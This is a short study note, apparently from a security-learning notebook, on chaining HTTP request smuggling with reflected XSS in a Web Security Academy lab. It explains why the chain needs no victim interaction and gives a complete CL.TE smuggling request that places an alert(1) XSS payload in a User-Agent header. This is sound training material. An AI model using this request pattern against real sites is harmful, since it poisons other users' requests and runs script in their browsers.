---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Using HTTP request smuggling to exploit reflected XSS

If an application is vulnerable to both HTTP request smuggling and XSS, we can use it to affect other users. This method of exploit is superior to regular XSS in 2 ways:

1. It will <mark style="color:yellow;">not</mark> require interaction from the victim, normal reflected XSS requires users to click on a malicious link and wait for them to visit. In this case, we just need to smuggle our request and the next user's request will be affected.
2. It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.

Example of request:

`POST / HTTP/1.1`\
`Host: 0a4a001a0463760c82e4bc440047008f.web-security-academy.net`\
`Content-Length: 97`\
`Transfer-Encoding: chunked`

`0`

`GET /post?postId=9`\
`HTTP/1.1`\
<mark style="color:yellow;">`Host: localhost User-Agent: ">alert(1)`</mark>\
`Foo:x`

<img src="../.gitbook/assets/image (62).png" alt="" data-size="original">
